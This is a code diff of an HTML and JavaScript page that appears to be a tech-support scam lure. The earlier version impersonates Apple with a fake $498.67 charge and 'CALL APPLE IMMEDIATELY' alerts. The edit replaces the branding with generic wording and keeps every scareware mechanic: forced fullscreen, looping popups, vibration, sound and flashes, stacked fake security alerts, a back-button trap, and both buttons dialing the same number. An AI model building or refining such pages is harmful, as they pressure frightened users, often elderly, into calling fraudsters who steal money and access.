@@ -21,7 +21,6 @@ body {
   padding: 20px;
 }
 
-/* FLASH */
 .flash {
   position: fixed;
   inset: 0;
@@ -31,7 +30,6 @@ body {
   transition: 0.2s;
 }
 
-/* TOPBAR */
 .topbar {
   position: fixed;
   top: 0;
@@ -57,7 +55,6 @@ body {
   background: #34c759;
 }
 
-/* CARD */
 .card {
   background: #1f1f1f;
   color: #fff;
@@ -98,7 +95,6 @@ p {
 .btn-call { background:#1976ff; }
 .btn-dismiss { background:#d93025; }
 
-/* POPUP */
 .popup {
   position: fixed;
   inset: 0;
@@ -125,7 +121,6 @@ p {
   opacity: 1;
 }
 
-/* STACK NOTIFICATIONS */
 .stack {
   position: fixed;
   top: 10px;
@@ -159,26 +154,26 @@ p {
 <div class="topbar">
   <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
   <span class="dot"></span>
-  <span>APPLE &nbsp;+1 (999) 999-9999</span>
+  <span>YOUR COMPANY &nbsp;+1 (999) 999-9999</span>
 </div>
 
 <div class="card">
   <h1>SECURITY VERIFICATION.</h1>
-  <p>Apple Account was recently used at the Apple Store for a $498.67 transaction via Apple Payment (Pre-Auth).</p>
-  <p>If you did not authorize this purchase, please contact Appple Supp0rt immediately at..</p>
+  <p>This is a notification regarding your recent account activity.</p>
+  <p>If you did not authorize this, please contact support.</p>
 
   <div class="phone">+1 (999) 999-9999</div>
 
   <div class="actions">
-    <a class="btn btn-call" href="tel:+1 (999) 999-9999">Call Now</a>
-    <a class="btn btn-dismiss" href="tel:+1 (999) 999-9999">Ignore</a>
+    <a class="btn btn-call" href="tel:+19999999999">Call Now</a>
+    <a class="btn btn-dismiss" href="tel:+19999999999">Ignore</a>
   </div>
 </div>
 
 <div class="popup" id="popup">
   <div class="popup-box">
 SYSTEM NOTIFICATION<br>
-     REVIEW YOUR ACCOUNT ACTIVITY
+REVIEW YOUR ACCOUNT ACTIVITY
   </div>
 </div>
 
@@ -192,22 +187,21 @@ const sound = document.getElementById("sound");
 const flash = document.getElementById("flash");
 const stack = document.getElementById("stack");
 
-// FULLSCREEN FUNCTION
 function goFullScreen() {
   let el = document.documentElement;
   if (el.requestFullscreen) el.requestFullscreen();
   else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
 }
 
-// TRY AUTO FULLSCREEN ON LOAD (may fail silently)
 window.onload = function() {
   goFullScreen();
 };
 
-// ALSO TRY ON FIRST TOUCH (guaranteed)
-document.addEventListener("touchstart", goFullScreen, { once: true });
+document.addEventListener("touchstart", function(e){
+  if (e.target.closest(".btn")) return;
+  goFullScreen();
+}, { once: true });
 
-// AUTO POPUP
 setTimeout(showPopup, 3000);
 
 function showPopup() {
@@ -215,35 +209,30 @@ function showPopup() {
   setTimeout(() => popup.classList.remove("show"), 1500);
 }
 
-// LOOP POPUP
 setInterval(showPopup, 4000);
 
-// VIBRATION LOOP
 setInterval(() => {
   if (navigator.vibrate) navigator.vibrate([200,100,200]);
 }, 4000);
 
-// SOUND LOOP
 setInterval(() => {
   sound.play().catch(()=>{});
 }, 5000);
 
-// FLASH
 setInterval(() => {
   flash.style.opacity = "1";
   setTimeout(()=> flash.style.opacity="0", 150);
 }, 5000);
 
-// STACKED NOTIFICATIONS
 setInterval(() => {
   let div = document.createElement("div");
   div.className = "note";
-  div.innerText = " COMPROMISE SECURITY >>> CALL APPLE IMMEDIATELY <<<";
+  div.innerText = "Security alert: Please review your account activity.";
   stack.appendChild(div);
   setTimeout(()=> div.remove(), 4000);
-}, 2500);Q
+}, 2500);
 
-// TAP → FULLSCREEN + EFFECTS
+// 👉 FULLSCREEN ON TAP (EXCEPT BUTTONS)
 document.body.addEventListener("click", function(e){
   if (e.target.closest(".btn")) return;
 
@@ -253,7 +242,6 @@ document.body.addEventListener("click", function(e){
   sound.play().catch(()=>{});
 });
 
-// SAFE BACK BUTTON
 history.pushState(null, null, location.href);
 window.addEventListener("popstate", function () {
   let leave = confirm("Are you sure you want to leave this page?");
